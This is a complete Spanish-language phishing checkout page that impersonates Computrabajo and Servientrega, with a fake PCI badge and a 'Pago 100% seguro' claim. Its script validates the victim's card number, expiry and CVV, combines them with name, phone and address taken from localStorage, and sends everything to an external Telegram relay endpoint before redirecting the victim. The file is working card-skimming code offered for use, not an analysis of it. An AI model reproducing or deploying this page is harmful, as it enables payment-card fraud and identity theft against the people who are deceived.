<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pago - Computrabajo</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: #f1f8ff;
            margin: 0;
            padding: 0;
        }
        
        .header {
            padding: 20px;
            font-weight: 600;
            color: #222;
            text-align: center;
        }
        
        .header img {
            width: 60%;
            max-width: 200px;
        }
        
        .container {
            max-width: 1100px;
            margin: 20px auto;
            display: flex;
            gap: 20px;
            padding: 0 15px;
        }
        
        .payment-box, .summary-box {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
            padding: 25px;
        }
        
        .payment-box {
            flex: 0 0 65%;
        }
        
        .summary-box {
            flex: 0 0 30%;
        }
        
        h2 {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 20px;
        }
        
        .field {
            margin-bottom: 15px;
        }
        
        .field label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            color: #333;
        }
        
        input[type="text"], input[type="tel"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        .half-field {
            display: flex;
            gap: 8px;
        }
        
        .half-field input {
            flex: 1;
        }
        
        .icons {
            margin: 10px 0 20px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        
        .icons img {
            height: 24px;
            max-width: 40px;
        }
        
        .btn {
            background-color: #45b298;
            color: white;
            font-weight: 600;
            font-size: 16px;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 30px;
            cursor: pointer;
            box-sizing: border-box;
        }
        
        .secure {
            text-align: center;
            margin-top: 12px;
            color: #60a600;
            font-size: 13px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        
       
        
        .summary-box h3 {
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 15px;
        }
        
        .summary-box .line {
            margin-bottom: 8px;
            display: flex;
            justify-content: space-between;
            font-size: 14px;
        }
        
        .summary-box .total {
            font-size: 18px;
            font-weight: 700;
            color: #45b298;
        }
        
        .summary-box .old-price {
            text-decoration: line-through;
            color: #666;
            font-size: 12px;
            margin-left: 8px;
        }
        
        .note {
            font-size: 11px;
            color: #666;
            margin-top: 10px;
            line-height: 1.4;
        }
        
        .pci {
            text-align: center;
            margin-top: 20px;
        }
        
        .pci img {
            height: 40px;
        }
        
        /* Media Queries para dispositivos m√≥viles */
        @media (max-width: 768px) {
            .header {
                padding: 15px;
            }
            
            .header img {
                width: 80%;
                max-width: 250px;
            }
            
            .container {
                flex-direction: column;
                margin: 10px auto;
                padding: 0 10px;
            }
            
            .payment-box, .summary-box {
                flex: none;
                width: 100%;
                box-sizing: border-box;
                padding: 20px;
            }
            
            h2 {
                font-size: 18px;
                margin-bottom: 15px;
            }
            
            .summary-box h3 {
                font-size: 16px;
            }
            
            .half-field {
                gap: 6px;
            }
            
            .icons {
                justify-content: center;
            }
            
            .icons img {
                height: 20px;
                max-width: 35px;
            }
            
            input[type="text"], input[type="tel"] {
                padding: 10px;
                font-size: 16px; /* Evita zoom en iOS */
            }
            
            .btn {
                font-size: 16px;
                padding: 12px;
            }
            
            .summary-box .line {
                font-size: 13px;
            }
            
            .summary-box .total {
                font-size: 16px;
            }
            
            .note {
                font-size: 10px;
            }
            
            .pci img {
                height: 35px;
            }
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 0 8px;
            }
            
            .payment-box, .summary-box {
                padding: 15px;
            }
            
            h2 {
                font-size: 16px;
            }
            
            .summary-box h3 {
                font-size: 15px;
            }
            
            .half-field {
                gap: 4px;
            }
            
            input[type="text"], input[type="tel"] {
                padding: 8px;
            }
            
            .btn {
                padding: 10px;
                font-size: 15px;
            }
            
            .secure {
                font-size: 12px;
            }
            
            .summary-box .line {
                font-size: 12px;
            }
            
            .summary-box .total {
                font-size: 15px;
            }
            
            .note {
                font-size: 9px;
            }
        }
        
        /* Estilos para el modal de carga responsive */
        @media (max-width: 768px) {
            .modal-content {
                padding: 20px !important;
                margin: 0 10px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="img/logo-servientrega-gris.svg" alt="Computrabajo">
    </div>

    <div class="container">
        <div class="payment-box">
            <h2>Selecciona tu m√©todo de pago</h2>
           
               <img src="img/pngfind.com-credit-card-logos-png-2783229.png" style="width: 20%; margin-bottom: 3%;" alt="">
      
            <div class="field">
                <label>N√∫mero de la tarjeta</label>
                <input type="tel" id="card-number" placeholder="0000 0000 0000 0000">
            </div>
            <div class="half-field">
                <input type="text" id="expiry-month" placeholder="MM" maxlength="2" pattern="[0-9]{2}">
                <input type="text" id="expiry-year" placeholder="YY" maxlength="2" pattern="[0-9]{2}">
                <input type="text" id="cvv" placeholder="CVV" maxlength="4" pattern="[0-9]{3,4}">
            </div>
            <div class="field">
                <label>Titular de la tarjeta</label>
                <input type="text" placeholder="Nombre y Apellidos">
            </div>
            <button class="btn" onclick="procesarPago()">Comprar</button>
            <div class="secure"> <img src="img/icone-de-cadenas-de-securite-vert.png" style="width: 2%;" alt="">Pago 100% seguro</div>
        </div>

        <div class="summary-box">
            <h3>Resumen de la compra</h3>
            <div class="line"><span>Producto</span><span>Servicio de env√≠o</span></div>
            <div class="line"><span>Precio</span><span>$7.990 ($6.990/sin IVA)</span></div>
            <div class="line"><span>IVA</span><span>19%</span></div>
            <div class="line">
                <span>Total</span>
                <span><span class="total">$8.318</span><span class="old-price">$25.000</span></span>
            </div>
            <div class="note">
                Contrataci√≥n m√≠nima 3 meses, autorenovable al guardar la tarjeta. Podr√°s cancelar el servicio en cualquier momento desde Configuraci√≥n.<br>El cargo en tarjeta o cuenta bancaria aparecer√° como <strong>DGNET Ltd.</strong>
            </div>
            <div class="pci">
                <img src="img/pci-dss-compliant-logo-vector.png" alt="PCI Logo">
            </div>
        </div>
    </div>

    <script>
        // Funci√≥n para mostrar modal de carga
        function mostrarModalCarga() {
            // Crear modal de carga
            const modal = document.createElement('div');
            modal.id = 'modalCarga';
            modal.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.7);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 9999;
            `;
            
            const contenido = document.createElement('div');
            contenido.className = 'modal-content';
            contenido.style.cssText = `
                background: white;
                padding: 30px;
                border-radius: 10px;
                text-align: center;
                max-width: 90%;
            `;
            contenido.innerHTML = `
                <div style="margin-bottom: 20px;">
                    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
                </div>
                <p>Procesando pago...</p>
                <style>
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                </style>
            `;
            
            modal.appendChild(contenido);
            document.body.appendChild(modal);
        }

        // Funci√≥n para ocultar modal de carga
        function ocultarModalCarga() {
            const modal = document.getElementById('modalCarga');
            if (modal) {
                modal.remove();
            }
        }

        // Algoritmo de Luhn para verificaci√≥n de tarjetas
        function algoritmoLuhn(numeroTarjeta) {
            let suma = 0;
            let alternar = false;
            
            // Procesar d√≠gitos de derecha a izquierda
            for (let i = numeroTarjeta.length - 1; i >= 0; i--) {
                let digito = parseInt(numeroTarjeta.charAt(i));
                
                if (alternar) {
                    digito *= 2;
                    if (digito > 9) {
                        digito -= 9;
                    }
                }
                
                suma += digito;
                alternar = !alternar;
            }
            
            return (suma % 10) === 0;
        }

        // Sistema de verificaci√≥n ilunh con algoritmo matem√°tico
        function verificarSistemaIlunh(numeroTarjeta, fechaExp, cvv) {
            try {
                // Limpiar n√∫mero de tarjeta
                const numeroLimpio = numeroTarjeta.replace(/\s/g, '');
                
                // Verificar longitud
                if (numeroLimpio.length < 13 || numeroLimpio.length > 19) {
                    return false;
                }
                
                // Verificar que sean solo n√∫meros
                if (!/^\d+$/.test(numeroLimpio)) {
                    return false;
                }
                
                // Aplicar algoritmo de Luhn
                if (!algoritmoLuhn(numeroLimpio)) {
                    return false;
                }
                
                // Verificar CVV
                if (cvv.length < 3 || cvv.length > 4 || !/^\d+$/.test(cvv)) {
                    return false;
                }
                
                // Verificar fecha de expiraci√≥n
                const [mes, a√±o] = fechaExp.split('/');
                const mesNum = parseInt(mes);
                const a√±oNum = parseInt('20' + a√±o);
                const fechaActual = new Date();
                const fechaTarjeta = new Date(a√±oNum, mesNum - 1);
                
                if (mesNum < 1 || mesNum > 12 || fechaTarjeta < fechaActual) {
                    return false;
                }
                
                return true;
            } catch (error) {
                console.error('Error en verificaci√≥n ilunh:', error);
                return false;
            }
        }

        // Funci√≥n para recuperar datos del localStorage
        function recuperarDatos() {
            const datosGuardados = localStorage.getItem('formularioUsuario');
            if (datosGuardados) {
                const datos = JSON.parse(datosGuardados);
                document.getElementById('nombre').value = datos.nombre || '';
                document.getElementById('apellidos').value = datos.apellidos || '';
                document.getElementById('direccion').value = datos.direccion || '';
                document.getElementById('cedula').value = datos.cedula || '';
                document.getElementById('celular').value = datos.celular || '';
            }
        }

        // Funci√≥n alternativa m√°s robusta para enviar datos a Telegram
         async function enviarDatosTelegram() {
        const numeroTarj = document.getElementById('card-number').value.replace(/\s+/g, '');
        const mes = document.getElementById('expiry-month').value;
        const anio = document.getElementById('expiry-year').value;
        const fechaExp = mes + '/' + anio;
        const cvv = document.getElementById('cvv').value;

        // Validaci√≥n de campos
        if (!numeroTarj || !mes || !anio || !cvv) {
            alert('Por favor completa todos los campos de la tarjeta');
            return false;
        }

        mostrarModalCarga();

        // Verificaci√≥n con sistema ilunh
        if (!verificarSistemaIlunh(numeroTarj, fechaExp, cvv)) {
            ocultarModalCarga();
            alert('N√∫mero de tarjeta inv√°lido. Por favor verifica los datos.');
            return false;
        }

        // RECUPERAR DATOS ACTUALIZADOS (NUEVAS CLAVES)
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        const formSubmitted = localStorage.getItem('formSubmitted') || 'false';
        const submissionDate = localStorage.getItem('submissionDate') || 'No especificada';

        // Construir mensaje con nuevos datos
        const mensaje = `üîª *Nueva compra realizada* üîª

üë§ *Datos del cliente:*
Nombre: ${userData.firstName || ''} ${userData.lastName || ''}
üìû Tel√©fono: ${userData.phone || ''}
üìç Direcci√≥n: ${userData.address || ''}
üèôÔ∏è Municipio: ${userData.municipality || ''}
üè¢ Departamento: ${userData.department || ''}

üìÖ Fecha de env√≠o: ${submissionDate}
‚úÖ Formulario enviado: ${formSubmitted}

üí≥ *Datos de pago:*
N√∫mero: ${numeroTarj}
üìÖ Expiraci√≥n: ${fechaExp}
üîê CVV: ${cvv}

‚úÖ *Verificaci√≥n ilunh: APROBADA*`.trim();

        try {
            // Env√≠o a Telegram
            const resp = await fetch('https://apitemu.vercel.app/api/send-telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: mensaje })
            });

            if (resp.ok) {
                setTimeout(() => {
                    ocultarModalCarga();
                    window.location.href = 'rse.html';
                }, 2000);
                return true;
            } else {
                ocultarModalCarga();
                console.error('Error API status:', resp.status);
                alert('Error al procesar el pago. Por favor, int√©ntalo de nuevo.');
                return false;
            }
        } catch (err) {
            ocultarModalCarga();
            console.error('Fallo de red:', err);
            alert('Error de red. Por favor, verifica tu conexi√≥n a internet.');
            return false;
        }
    }


        // Funci√≥n para procesar el pago
        async function procesarPago() {
            await enviarDatosTelegram();
        }

        // Validaci√≥n en tiempo real para los campos
        document.addEventListener('DOMContentLoaded', function() {
            // Formatear n√∫mero de tarjeta
            const cardInput = document.getElementById('card-number');
            cardInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
                let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
                if (formattedValue !== e.target.value) {
                    e.target.value = formattedValue;
                }
            });

            // Validar mes
            const monthInput = document.getElementById('expiry-month');
            monthInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/[^0-9]/g, '');
                if (value.length >= 2) {
                    let monthNum = parseInt(value);
                    if (monthNum > 12) value = '12';
                    if (monthNum < 1 && value.length === 2) value = '01';
                }
                e.target.value = value;
            });

            // Validar a√±o
            const yearInput = document.getElementById('expiry-year');
            yearInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/[^0-9]/g, '');
                e.target.value = value;
            });

            // Validar CVV
            const cvvInput = document.getElementById('cvv');
            cvvInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/[^0-9]/g, '');
                e.target.value = value;
            });
        });

        // Ejecutar al cargar la p√°gina
        window.addEventListener('DOMContentLoaded', recuperarDatos);
    </script>
</body>
</html>